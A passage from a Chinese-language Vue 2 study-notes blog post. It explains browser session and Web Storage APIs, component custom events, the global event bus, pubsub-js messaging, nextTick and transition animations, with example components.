<p><strong>为什么要用session</strong><br>由于cookie 是存在用户端，而且它本身存储的尺寸大小也有限，最关键是用户可以是可见的，并可以随意的修改，很不安全。那如何又要安全，又可以方便的全局读取信息呢？于是，这个时候，一种新的存储会话机制：session 诞生了</p>
<p><strong>session原理</strong><br>当客户端第一次请求服务器的时候，服务器生成一份session保存在服务端，将该数据(session)的id以cookie的形式传递给客户端；以后的每次请求，浏览器都会自动的携带cookie来访问服务器(session数据id)。</p>
<blockquote>
<p>图示：</p>
</blockquote>
<img src="image-20230406192445359.png" style="zoom:80%;border: 5px solid orange;" />

<blockquote>
<p>session我觉得可以简单理解为一个表，根据cookie传来的值查询表中的内容</p>
</blockquote>
<p><strong>session 标准工作流程</strong></p>
<img src="image-20230406192453125.png" style="border: 5px solid orange;" />

<p>我在 node.js 中详细演示了一遍 session 的使用，具体看了另一篇博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hangao233/article/details/123089029">https://blog.csdn.net/hangao233/article/details/123089029</a></p>
<h3 id="2-3-3-LocalStorage"><a href="#2-3-3-LocalStorage" class="headerlink" title="2.3.3 LocalStorage"></a>2.3.3 LocalStorage</h3><p>LocalStorage是HTML5新引入的特性，由于有的时候我们存储的信息较大，Cookie就不能满足我们的需求，这时候LocalStorage就派上用场了。</p>
<p><strong>LocalStorage的优点：</strong></p>
<ul>
<li>在大小方面，LocalStorage的大小一般为5MB，可以储存更多的信息</li>
<li>LocalStorage是持久储存，并不会随着页面的关闭而消失，除非主动清理，不然会永久存在</li>
<li>仅储存在本地，不像Cookie那样每次HTTP请求都会被携带</li>
</ul>
<p><strong>LocalStorage的缺点：</strong></p>
<ul>
<li>存在浏览器兼容问题，IE8以下版本的浏览器不支持</li>
<li>如果浏览器设置为隐私模式，那我们将无法读取到LocalStorage</li>
<li>LocalStorage受到同源策略的限制，即端口、协议、主机地址有任何一个不相同，都不会访问</li>
</ul>
<p><strong>LocalStorage的常用API：</strong></p>
<pre><code class="js">// 保存数据到 localStorage
localStorage.setItem(&#39;key&#39;, &#39;value&#39;);

// 从 localStorage 获取数据
let data = localStorage.getItem(&#39;key&#39;);

// 从 localStorage 删除保存的数据
localStorage.removeItem(&#39;key&#39;);

// 从 localStorage 删除所有保存的数据
localStorage.clear();

// 获取某个索引的Key
localStorage.key(index)
</code></pre>
<p><strong>LocalStorage的使用场景:</strong></p>
<ul>
<li>有些网站有换肤的功能，这时候就可以将换肤的信息存储在本地的LocalStorage中，当需要换肤的时候，直接操作LocalStorage即可</li>
<li>在网站中的用户浏览信息也会存储在LocalStorage中，还有网站的一些不常变动的个人信息等也可以存储在本地的LocalStorage中</li>
</ul>
<h3 id="2-3-4-SessionStorage"><a href="#2-3-4-SessionStorage" class="headerlink" title="2.3.4 SessionStorage"></a>2.3.4 SessionStorage</h3><p>SessionStorage和LocalStorage都是在HTML5才提出来的存储方案，SessionStorage 主要用于临时保存同一窗口(或标签页)的数据，刷新页面时不会删除，关闭窗口或标签页之后将会删除这些数据。</p>
<p><strong>SessionStorage与LocalStorage对比：</strong></p>
<ul>
<li>SessionStorage和LocalStorage都在<strong>本地进行数据存储</strong>；</li>
<li>SessionStorage也有同源策略的限制，但是SessionStorage有一条更加严格的限制，SessionStorage<strong>只有在同一浏览器的同一窗口下才能够共享</strong>；</li>
<li>LocalStorage和SessionStorage<strong>都不能被爬虫爬取</strong>；</li>
</ul>
<p><strong>SessionStorage的常用API：</strong></p>
<pre><code class="js">// 保存数据到 sessionStorage
sessionStorage.setItem(&#39;key&#39;, &#39;value&#39;);

// 从 sessionStorage 获取数据
let data = sessionStorage.getItem(&#39;key&#39;);

// 从 sessionStorage 删除保存的数据
sessionStorage.removeItem(&#39;key&#39;);

// 从 sessionStorage 删除所有保存的数据
sessionStorage.clear();

// 获取某个索引的Key
sessionStorage.key(index)
</code></pre>
<p><strong>SessionStorage的使用场景</strong></p>
<p>由于SessionStorage具有时效性，所以可以用来存储一些网站的游客登录的信息，还有临时的浏览记录的信息。当关闭网站之后，这些信息也就随之消除了。</p>
<blockquote>
<p>具体案例：</p>
</blockquote>
<p><strong>localStorage</strong></p>
<pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;UTF-8&quot; /&gt;
        &lt;title&gt;localStorage&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h2&gt;localStorage&lt;/h2&gt;
        &lt;button onclick=&quot;saveData()&quot;&gt;点我保存一个数据&lt;/button&gt;
        &lt;button onclick=&quot;readData()&quot;&gt;点我读取一个数据&lt;/button&gt;
        &lt;button onclick=&quot;deleteData()&quot;&gt;点我删除一个数据&lt;/button&gt;
        &lt;button onclick=&quot;deleteAllData()&quot;&gt;点我清空一个数据&lt;/button&gt;

        &lt;script type=&quot;text/javascript&quot; &gt;
            let p = &#123;name:&#39;张三&#39;,age:18&#125;

            function saveData()&#123;
                localStorage.setItem(&#39;msg&#39;,&#39;hello!!!&#39;)
                localStorage.setItem(&#39;msg2&#39;,666)
                // 转成 JSON 对象存进去
                localStorage.setItem(&#39;person&#39;,JSON.stringify(p))
            &#125;
            function readData()&#123;
                console.log(localStorage.getItem(&#39;msg&#39;))
                console.log(localStorage.getItem(&#39;msg2&#39;))

                const result = localStorage.getItem(&#39;person&#39;)
                console.log(JSON.parse(result))

                // console.log(localStorage.getItem(&#39;msg3&#39;))
            &#125;
            function deleteData()&#123;
                localStorage.removeItem(&#39;msg2&#39;)
            &#125;
            function deleteAllData()&#123;
                localStorage.clear()
            &#125;
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><strong>sessionStorage</strong></p>
<pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;UTF-8&quot; /&gt;
        &lt;title&gt;sessionStorage&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h2&gt;sessionStorage&lt;/h2&gt;
        &lt;button onclick=&quot;saveData()&quot;&gt;点我保存一个数据&lt;/button&gt;
        &lt;button onclick=&quot;readData()&quot;&gt;点我读取一个数据&lt;/button&gt;
        &lt;button onclick=&quot;deleteData()&quot;&gt;点我删除一个数据&lt;/button&gt;
        &lt;button onclick=&quot;deleteAllData()&quot;&gt;点我清空一个数据&lt;/button&gt;

        &lt;script type=&quot;text/javascript&quot; &gt;
            let p = &#123;name:&#39;张三&#39;,age:18&#125;

            function saveData()&#123;
                sessionStorage.setItem(&#39;msg&#39;,&#39;hello!!!&#39;)
                sessionStorage.setItem(&#39;msg2&#39;,666)
                // 转换成JSON 字符串存进去
                sessionStorage.setItem(&#39;person&#39;,JSON.stringify(p))
            &#125;
            function readData()&#123;
                console.log(sessionStorage.getItem(&#39;msg&#39;))
                console.log(sessionStorage.getItem(&#39;msg2&#39;))

                const result = sessionStorage.getItem(&#39;person&#39;)
                console.log(JSON.parse(result))

                // console.log(sessionStorage.getItem(&#39;msg3&#39;))
            &#125;
            function deleteData()&#123;
                sessionStorage.removeItem(&#39;msg2&#39;)
            &#125;
            function deleteAllData()&#123;
                sessionStorage.clear()
            &#125;
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="2-3-5-總結WebStorage"><a href="#2-3-5-總結WebStorage" class="headerlink" title="2.3.5 總結WebStorage"></a>2.3.5 總結WebStorage</h3><ul>
<li>存儲內容大小一般支持5MB左右(不同瀏覽器可能不一樣)</li>
<li>瀏覽器端通過Window.session.Storage 和 Window.localStroage 屬性來實現本地存儲機制</li>
<li>相關API：<ul>
<li><code>xxxxxStorage.setItem(&#39;key&#39;,&#39;value&#39;)</code>：該方法接受一個鍵和值作為參數，會把鍵值對添加到存儲中，如果鍵名存在，則更新其對應的值</li>
<li><code>xxxxxStorage.getItem(&#39;person&#39;)</code>： 該方法接受一個鍵名作為參數，返回鍵名對應的值</li>
<li><code>xxxxxStorage.removeItem(&#39;key&#39;)</code>：該方法接受一個鍵名作為參數，並把該鍵名從存儲中刪除</li>
<li><code>xxxxxStorage.clear()</code>：該方法會清空存儲中的所有數據</li>
</ul>
</li>
<li>備註：<ul>
<li>SessionStorage存儲的內容會隨著瀏覽器窗口關閉而消失</li>
<li>LocalStorage存儲的內容，需要手動清除才會消失</li>
<li><code>xxxxxStorage.getItem(&#39;key&#39;)</code>如果key對應的value獲取不到，則getItem的返回值是null</li>
<li><code>JSON.parse(null)</code>的結果依然是null</li>
</ul>
</li>
</ul>
<h2 id="2-4-组件自定义事件"><a href="#2-4-组件自定义事件" class="headerlink" title="2.4 组件自定义事件"></a>2.4 组件自定义事件</h2><h3 id="2-4-1-綁定自定义事件"><a href="#2-4-1-綁定自定义事件" class="headerlink" title="2.4.1 綁定自定义事件"></a>2.4.1 綁定自定义事件</h3><p>组件自定义事件是一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===&gt; 父组件</strong></p>
<p><strong>使用场景</strong></p>
<p>A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。</p>
<p><strong>绑定自定义事件：</strong></p>
<h5 id="1-方式一：v-on"><a href="#1-方式一：v-on" class="headerlink" title="1.  方式一：v-on"></a>1.  方式一：v-on</h5><p>第一种方式，在父组件中：<code>&lt;Demo @atguigu=&quot;test&quot;/&gt;</code>或 <code>&lt;Demo v-on:atguigu=&quot;test&quot;/&gt;</code></p>
<blockquote>
<p>具体代码</p>
</blockquote>
<p>App.vue</p>
<pre><code class="html">&lt;template&gt;
    &lt;div class=&quot;app&quot;&gt;
        &lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第一种写法，使用@或v-on） --&gt;
        &lt;Student @atguigu=&quot;getStudentName&quot;/&gt; 
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    import Student from &#39;./components/Student&#39;

    export default &#123;
        name:&#39;App&#39;,
        components:&#123;Student&#125;,
        data() &#123;
            return &#123;
                msg:&#39;你好啊！&#39;,
                studentName:&#39;&#39;
            &#125;
        &#125;,
        methods: &#123;
            getStudentName(name,...params)&#123;
                console.log(&#39;App收到了学生名：&#39;,name,params)
                this.studentName = name
            &#125;
        &#125;
    &#125;
&lt;/script&gt;

&lt;style scoped&gt;
    .app&#123;
        background-color: gray;
        padding: 5px;
    &#125;
&lt;/style&gt;
</code></pre>
<p>Student.vue</p>
<pre><code class="html">&lt;template&gt;
    &lt;div class=&quot;student&quot;&gt;
        &lt;button @click=&quot;sendStudentlName&quot;&gt;把学生名给App&lt;/button&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    export default &#123;
        name:&#39;Student&#39;,
        data() &#123;
            return &#123;
                name:&#39;张三&#39;,
            &#125;
        &#125;,
        methods: &#123;
            sendStudentlName()&#123;
                //触发Student组件实例身上的atguigu事件
                this.$emit(&#39;atguigu&#39;,this.name,666,888,900)
            &#125;
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style lang=&quot;less&quot; scoped&gt;
    .student&#123;
        background-color: pink;
        padding: 5px;
        margin-top: 30px;
    &#125;
&lt;/style&gt;
</code></pre>
<h5 id="2-方式二：ref"><a href="#2-方式二：ref" class="headerlink" title="2.  方式二：ref"></a>2.  方式二：ref</h5><p>第二种方式，在父组件中：</p>
<p>使用 <code>this.$refs.xxx.$on()</code> 这样写起来更灵活，比如可以加定时器啥的。</p>
<blockquote>
<p>具体代码</p>
</blockquote>
<p>App.vue</p>
<pre><code class="html">&lt;template&gt;
    &lt;div class=&quot;app&quot;&gt;
        &lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） --&gt;
        &lt;Student ref=&quot;student&quot;/&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    import Student from &#39;./components/Student&#39;

    export default &#123;
        name:&#39;App&#39;,
        components:&#123;Student&#125;,
        data() &#123;
            return &#123;
                studentName:&#39;&#39;
            &#125;
        &#125;,
        methods: &#123;
            getStudentName(name,...params)&#123;
                console.log(&#39;App收到了学生名：&#39;,name,params)
                this.studentName = name
            &#125;,
        &#125;,

    &#125;
&lt;/script&gt;

&lt;style scoped&gt;
    .app&#123;
        background-color: gray;
        padding: 5px;
    &#125;
&lt;/style&gt;
</code></pre>
<p>Student.vue</p>
<pre><code class="html">&lt;template&gt;
    &lt;div class=&quot;student&quot;&gt;
        &lt;button @click=&quot;sendStudentlName&quot;&gt;把学生名给App&lt;/button&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    export default &#123;
        name:&#39;Student&#39;,
        data() &#123;
            return &#123;
                name:&#39;张三&#39;,
            &#125;
        &#125;,
        methods: &#123;
            sendStudentlName()&#123;
                //触发Student组件实例身上的atguigu事件
                this.$emit(&#39;atguigu&#39;,this.name,666,888,900)
            &#125;
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style lang=&quot;less&quot; scoped&gt;
    .student&#123;
        background-color: pink;
        padding: 5px;
        margin-top: 30px;
    &#125;
&lt;/style&gt;
</code></pre>
<blockquote>
<p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。</p>
<p>触发自定义事件：<code>this.$emit(&#39;atguigu&#39;,数据)</code></p>
<p>使用 this.$emit() 就可以子组件向父组件传数据</p>
</blockquote>
<h3 id="2-4-2-解绑自定义事件"><a href="#2-4-2-解绑自定义事件" class="headerlink" title="2.4.2 解绑自定义事件"></a>2.4.2 解绑自定义事件</h3><p><strong>解绑自定义事件</strong><code>this.$off(&#39;atguigu&#39;)</code></p>
<blockquote>
<p>代码</p>
</blockquote>
<pre><code class="js">this.$off(&#39;atguigu&#39;) //解绑一个自定义事件
// this.$off([&#39;atguigu&#39;,&#39;demo&#39;]) //解绑多个自定义事件
// this.$off() //解绑所有的自定义事件
</code></pre>
<p><strong>组件上也可以绑定原生DOM事件，需要使用<code>native</code>修饰符。</strong></p>
<blockquote>
<p>代码</p>
</blockquote>
<pre><code class="vue">&lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） --&gt;
&lt;Student ref=&quot;student&quot; @click.native=&quot;show&quot;/&gt;
</code></pre>
<blockquote>
<p>注意：在mounted()中通过<code>this.$refs.xxx.$on(&#39;atguigu&#39;,回调)</code>绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！</p>
</blockquote>
<h3 id="2-4-3-自定義事件總結"><a href="#2-4-3-自定義事件總結" class="headerlink" title="2.4.3 自定義事件總結"></a>2.4.3 自定義事件總結</h3><ul>
<li><p>组件自定义事件是一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===&gt; 父组件</strong></p>
</li>
<li><p>使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。</p>
</li>
<li><p>绑定自定义事件：</p>
<ul>
<li><p>第一种方式，在父组件中：<code>&lt;Demo @atguigu=&quot;test&quot;/&gt;</code>或 <code>&lt;Demo v-on:atguigu=&quot;test&quot;/&gt;</code></p>
</li>
<li><p>第二种方式，在父组件中：</p>
<pre><code class="vue">&lt;Demo ref=&quot;demo&quot;/&gt;
.....
mounted() &#123;
    this.$refs.xxx.$on(&#39;atguigu&#39;,this.test) //绑定自定义事件
&#125;,
</code></pre>
</li>
<li><p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。</p>
</li>
</ul>
</li>
<li><p>触发自定义事件：<code>this.$emit(&#39;atguigu&#39;,数据)</code></p>
</li>
<li><p>解绑自定义事件<code>this.$off(&#39;atguigu&#39;)</code></p>
</li>
<li><p>组件上也可以绑定原生DOM事件，需要使用<code>native</code>修饰符。</p>
</li>
<li><p>注意：在mounted()中通过<code>this.$refs.xxx.$on(&#39;atguigu&#39;,回调)</code>绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！</p>
</li>
</ul>
<blockquote>
<p>誰調用自定義事件誰就是this，此處的this是Student組件的實例對象vc；使用箭頭函數因為沒有this，會往外面找，所以this為vm；</p>
<p>而使用method配置時，因mehod定義在vm中，Vue官方承諾使用正常定義時，this會為當前的實例對象，此處為vm。</p>
</blockquote>
<h2 id="2-5-全局事件总线"><a href="#2-5-全局事件总线" class="headerlink" title="2.5 全局事件总线"></a>2.5 全局事件总线</h2><p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230410160646819.png" alt="image-20230410160646819"></p>
<ol>
<li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p>
</li>
<li><p>安装全局事件总线：</p>
<pre><code class="js">new Vue(&#123;
    ......
    beforeCreate() &#123;
        Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
    &#125;,
    ......
&#125;) 
</code></pre>
</li>
<li><p>使用事件总线：</p>
<ol>
<li><p>接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span></p>
<pre><code class="js">//方式一：回调配置在methods中
methods()&#123;
  demo(data)&#123;......&#125;
&#125;
......
mounted() &#123;
  this.$bus.$on(&#39;xxxx&#39;,this.demo)
&#125;
   
</code></pre>
</li>
</ol>
<p>//方式二：使用箭頭函數配置回调<br>mounted() {<br>this.$bus.$on(‘xxxx’,(data)=&gt;{<br>console.log(‘我是School组件，收到了数据’,data)<br>})<br>}</p>
<pre><code>
</code></pre>
</li>
<li><p>提供数据：<code>this.$bus.$emit(&#39;xxxx&#39;,数据)</code></p>
</li>
<li><p>最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。</p>
</li>
</ol>
<blockquote>
<p>示例代码</p>
</blockquote>
<p>School.vue</p>
<pre><code class="html">&lt;template&gt;
    &lt;div class=&quot;school&quot;&gt;
        &lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;
        &lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    export default &#123;
        name:&#39;School&#39;,
        data() &#123;
            return &#123;
                name:&#39;尚硅谷&#39;,
                address:&#39;北京&#39;,
            &#125;
        &#125;,
        methods: &#123;
            demo(data) &#123;
                console.log(&#39;我是School组件，收到了数据&#39;,data)
            &#125;
        &#125;
        mounted() &#123;
            // console.log(&#39;School&#39;,this)
            this.$bus.$on(&#39;hello&#39;,this.demo)
        &#125;,
        beforeDestroy() &#123;
            this.$bus.$off(&#39;hello&#39;)
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style scoped&gt;
    .school&#123;
        background-color: skyblue;
        padding: 5px;
    &#125;
&lt;/style&gt;
</code></pre>
<p>Student.vue</p>
<pre><code class="html">&lt;template&gt;
    &lt;div class=&quot;student&quot;&gt;
        &lt;h2&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;
        &lt;h2&gt;学生性别：&#123;&#123;sex&#125;&#125;&lt;/h2&gt;
        &lt;button @click=&quot;sendStudentName&quot;&gt;把学生名给School组件&lt;/button&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    export default &#123;
        name:&#39;Student&#39;,
        data() &#123;
            return &#123;
                name:&#39;张三&#39;,
                sex:&#39;男&#39;,
            &#125;
        &#125;,
        mounted() &#123;
            // console.log(&#39;Student&#39;,this.x)
        &#125;,
        methods: &#123;
            sendStudentName()&#123;
                this.$bus.$emit(&#39;hello&#39;,this.name)
            &#125;
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style lang=&quot;less&quot; scoped&gt;
    .student&#123;
        background-color: pink;
        padding: 5px;
        margin-top: 30px;
    &#125;
&lt;/style&gt;
</code></pre>
<h2 id="2-6-消息订阅与发布"><a href="#2-6-消息订阅与发布" class="headerlink" title="2.6 消息订阅与发布"></a>2.6 消息订阅与发布</h2><ol>
<li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p>
</li>
<li><p>使用步骤：</p>
<ol>
<li><p>安装pubsub：<code>npm i pubsub-js</code></p>
</li>
<li><p>引入: <code>import pubsub from &#39;pubsub-js&#39;</code></p>
</li>
<li><p>接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span></p>
<pre><code class="js">methods:&#123;
  demo(data)&#123;......&#125;
&#125;
......
mounted() &#123;
  this.pid = pubsub.subscribe(&#39;xxx&#39;,this.demo) //订阅消息
&#125;
</code></pre>
</li>
<li><p>提供数据：<code>pubsub.publish(&#39;xxx&#39;,数据)</code></p>
</li>
<li><p>最好在beforeDestroy钩子中，用<code>PubSub.unsubscribe(pid)</code>去<span style="color:red">取消订阅。</span></p>
</li>
</ol>
</li>
</ol>
<blockquote>
<p>示例代码</p>
</blockquote>
<p>订阅消息</p>
<p><strong>School.vue</strong></p>
<pre><code class="html">&lt;template&gt;
    &lt;div class=&quot;school&quot;&gt;
        &lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;
        &lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    import pubsub from &#39;pubsub-js&#39;
    export default &#123;
        name:&#39;School&#39;,
        data() &#123;
            return &#123;
                name:&#39;尚硅谷&#39;,
                address:&#39;北京&#39;,
            &#125;
        &#125;,
        mounted() &#123;
            // console.log(&#39;School&#39;,this)
            /* this.$bus.$on(&#39;hello&#39;,(data)=&gt;&#123;
                console.log(&#39;我是School组件，收到了数据&#39;,data)
            &#125;) */
            this.pubId = pubsub.subscribe(&#39;hello&#39;,(msgName,data)=&gt;&#123;
                console.log(this)
                // console.log(&#39;有人发布了hello消息，hello消息的回调执行了&#39;,msgName,data)
            &#125;)
        &#125;,
        beforeDestroy() &#123;
            // this.$bus.$off(&#39;hello&#39;)
            pubsub.unsubscribe(this.pubId)
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style scoped&gt;
    .school&#123;
        background-color: skyblue;
        padding: 5px;
    &#125;
&lt;/style&gt;
</code></pre>
<p>发布消息</p>
<p><strong>Student.vue</strong></p>
<pre><code class="html">&lt;template&gt;
    &lt;div class=&quot;student&quot;&gt;
        &lt;h2&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;
        &lt;h2&gt;学生性别：&#123;&#123;sex&#125;&#125;&lt;/h2&gt;
        &lt;button @click=&quot;sendStudentName&quot;&gt;把学生名给School组件&lt;/button&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    import pubsub from &#39;pubsub-js&#39;
    export default &#123;
        name:&#39;Student&#39;,
        data() &#123;
            return &#123;
                name:&#39;张三&#39;,
                sex:&#39;男&#39;,
            &#125;
        &#125;,
        mounted() &#123;
            // console.log(&#39;Student&#39;,this.x)
        &#125;,
        methods: &#123;
            sendStudentName()&#123;
                // this.$bus.$emit(&#39;hello&#39;,this.name)
                pubsub.publish(&#39;hello&#39;,666)
            &#125;
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style lang=&quot;less&quot; scoped&gt;
    .student&#123;
        background-color: pink;
        padding: 5px;
        margin-top: 30px;
    &#125;
&lt;/style&gt;
</code></pre>
<blockquote>
<p><code>全局事件總線</code>和<code>消息訂閱與發佈</code>功能相同 =&gt; 建議使用全局事件總線，為Vue內部的技術</p>
</blockquote>
<h2 id="2-7-nextTick"><a href="#2-7-nextTick" class="headerlink" title="2.7 nextTick"></a>2.7 nextTick</h2><ol>
<li>语法：<code>this.$nextTick(回调函数)</code></li>
<li>作用：在下一次 DOM 更新结束后执行其指定的回调。</li>
<li>什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。</li>
</ol>
<p>具体案例</p>
<pre><code class="js">handleEdit(todo)&#123;
    if(todo.hasOwnProperty(&#39;isEdit&#39;))&#123;
        todo.isEdit = true
    &#125;else&#123;
        .......
    &#125;
    this.$nextTick(function(）&#123;
        this.$refs.inputTitle.focus()
    &#125;)
&#125;
</code></pre>
<blockquote>
<p>此處若不調用<code>this.$nextTick</code>直接使用<code>this.$refs.inputTitle.focus()</code>，此焦點事件會失效，因為Vue底層是將handleEdit裡面的全部代碼先跑完才將視圖解析，此時input框尚未解析出來，因此.focus()無法作用</p>
</blockquote>
<h2 id="2-8-Vue封装的过度与动画"><a href="#2-8-Vue封装的过度与动画" class="headerlink" title="2.8 Vue封装的过度与动画"></a>2.8 Vue封装的过度与动画</h2><ol>
<li><p>作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。</p>
</li>
<li><p>图示：</p>
<img src="image-20230406192546040.png" style="zoom:80%;border: 5px solid orange;" /></li>
<li><p>写法：</p>
<ol>
<li><p>准备好样式：</p>
<ul>
<li>元素进入的样式：<ol>
<li>v-enter：进入的起点</li>
<li>v-enter-active：进入过程中</li>
<li>v-enter-to：进入的终点</li>
</ol>
</li>
<li>元素离开的样式：<ol>
<li>v-leave：离开的起点</li>
<li>v-leave-active：离开过程中</li>
<li>v-leave-to：离开的终点</li>
</ol>
</li>
</ul>
</li>
<li><p>使用<code>&lt;transition&gt;</code>包裹要过渡的元素，并配置name属性：</p>
<pre><code class="html">&lt;transition name=&quot;hello&quot;&gt;
    &lt;h1 v-show=&quot;isShow&quot;&gt;你好啊！&lt;/h1&gt;
&lt;/transition&gt;
</code></pre>
</li>
<li><p>备注：若有多个元素需要过度，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code>值。</p>
</li>
</ol>
</li>
</ol>
<p>具体案例（单个元素过渡）</p>
<pre><code class="html">&lt;template&gt;
    &lt;div&gt;
        &lt;button @click=&quot;isShow = !isShow&quot;&gt;显示/隐藏&lt;/button&gt;
        &lt;transition appear&gt;
            &lt;h1 v-show=&quot;isShow&quot;&gt;你好啊！&lt;/h1&gt;
        &lt;/transition&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    export default &#123;
        name:&#39;Test&#39;,
        data() &#123;
            return &#123;
                isShow:true
            &#125;
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style scoped&gt;
    h1&#123;
        background-color: orange;
    &#125;

    .v-enter-active&#123;
        animation: move 0.5s linear;
    &#125;

    .v-leave-active&#123;
        animation: move 0.5s linear reverse;
    &#125;

    @keyframes move &#123;
        from&#123;
            transform: translateX(-100%);
        &#125;
        to&#123;
            transform: translateX(0px);
        &#125;
    &#125;
&lt;/style&gt;
</code></pre>
<blockquote>
<p>name 的作用可以让让不同的元素有不同的动画效果</p>
</blockquote>
<pre><code class="html">&lt;template&gt;
    &lt;div&gt;
        &lt;button @click=&quot;isShow = !isShow&quot;&gt;显示/隐藏&lt;/button&gt;
        &lt;transition name=&quot;hello&quot; appear&gt;
            &lt;h1 v-show=&quot;isShow&quot;&gt;你好啊！&lt;/h1&gt;
        &lt;/transition&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    export default &#123;
        name:&#39;Test&#39;,
        data() &#123;
            return &#123;
                isShow:true
            &#125;
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style scoped&gt;
    h1&#123;
        background-color: orange;
    &#125;

    .hello-enter-active&#123;
        animation: move 0.5s linear;
    &#125;

    .hello-leave-active&#123;
        animation: move 0.5s linear reverse;
    &#125;

    @keyframes move &#123;
        from&#123;
            transform: translateX(-100%);
        &#125;
        to&#123;
            transform: translateX(0px);
        &#125;
    &#125;
&lt;/style&gt;
</code></pre>
<p>具体案例（多个元素过渡）</p>
<pre><code class="html">&lt;template&gt;
    &lt;div&gt;
        &lt;button @click=&quot;isShow = !isShow&quot;&gt;显示/隐藏&lt;/button&gt;
        &lt;transition-group name=&quot;hello&quot; appear&gt;
            &lt;h1 v-show=&quot;!isShow&quot; key=&quot;1&quot;&gt;你好啊！&lt;/h1&gt;
            &lt;h1 v-show=&quot;isShow&quot; key=&quot;2&quot;&gt;尚硅谷！&lt;/h1&gt;
        &lt;/transition-group&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    export default &#123;
        name:&#39;Test&#39;,
        data() &#123;
            return &#123;
                isShow:true
            &#125;
        &#125;,
    &#125;
&lt;/script&gt;

&lt;style scoped&gt;
    h1&#123;
        background-color: orange;
    &#125;
    /* 进入的起点、离开的终点 */
    .hello-enter,.hello-leave-to&#123;
        transform: translateX(-100%);
    &#125;
    .hello-enter-active,.hello-leave-active&#123;
        transition: 0.5s linear;
    &#125;
    /* 进入的终点、离开的起点 */
    .hello-enter-to,.hello-leave&#123;
        transform: translateX(0);
    &#125;
&lt;/style&gt;
</code></pre>
<blockquote>
<p>使用第三库的具体案例（随便看看，这个不重要）<br>库的名称：Animate.css<br>安装：npm i animate.css<br>引入：import    ‘animate.css’</p>
</blockquote>
<pre><code class="html">&lt;template&gt;
    &lt;div&gt;
        &lt;button @click=&quot;isShow = !isShow&quot;&gt;显示/隐藏&lt;/button&gt;
        &lt;transition-group 
            appear
            name=&quot;animate__animated animate__bounce&quot; 
            enter-active-class=&quot;animate__swing&quot;
            leave-active-class=&quot;animate__backOutUp&quot;
        &gt;
            &lt;h1 v-show=&quot;!isShow&quot; key=&quot;1&quot;&gt;你好啊！&lt;/h1&gt;
            &lt;h1 v-show=&quot;isShow&quot; key=&quot;2&quot;&gt;尚硅谷！&lt;/h1&gt;
        &lt;/transition-group&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    import &#39;animate.css&#39;
    export default &#123;
        name:&#39;Test&#39;,
        data() &#123;
            return &#123;
                isShow:true
            &#125;
        &#125;,
    &#125;
